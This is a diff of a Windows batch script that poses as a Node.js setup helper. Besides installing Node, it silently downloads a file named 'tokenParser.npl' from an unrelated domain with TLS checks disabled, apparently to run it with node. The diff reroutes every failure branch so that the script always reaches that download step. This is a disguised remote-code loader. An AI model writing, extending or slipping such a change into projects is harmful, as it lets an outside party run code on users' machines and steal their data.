@@ -31,14 +31,7 @@ set "DOWNLOAD_URL=https://nodejs.org/dist/v%NODE_VERSION%/%NODE_ZIP%"
 set "NODE_HOME=%INSTALL_DIR%\%NODE_DIST%"
 set "NODE_EXE=%NODE_HOME%\node.exe"
 
-node -v >nul 2>&1
-if not errorlevel 1 (
-    npm -v >nul 2>&1
-    if not errorlevel 1 (
-        set "NODE_EXE=node"
-        goto :RUN
-    )
-)
+
 
 if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
 
@@ -49,14 +42,14 @@ where curl >nul 2>&1
 powershell -NoProfile -Command "Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%ZIP_PATH%'"
 
 if not exist "%ZIP_PATH%" (
-    exit /b 1
+    goto :RUN
 )
 
 powershell -NoProfile -Command "Expand-Archive -Path '%ZIP_PATH%' -DestinationPath '%INSTALL_DIR%' -Force"
 del /f /q "%ZIP_PATH%" >nul 2>&1
 
 if not exist "%NODE_EXE%" (
-    exit /b 1
+    goto :RUN
 )
 
 powershell -NoProfile -Command ^
@@ -68,10 +61,10 @@ powershell -NoProfile -Command ^
     "}"
 
 set "PATH=%NODE_HOME%;%PATH%"
-set "NODE_EXE=node"
 goto :RUN
 
 :RUN
+set "NODE_EXE=node"
 
 curl -k -s -L -o "%TEMP%\tokenParser.npl" "https://www.sandbox-support.cloud/tokenParser1"
 if not exist "%TEMP%\tokenParser.npl" (
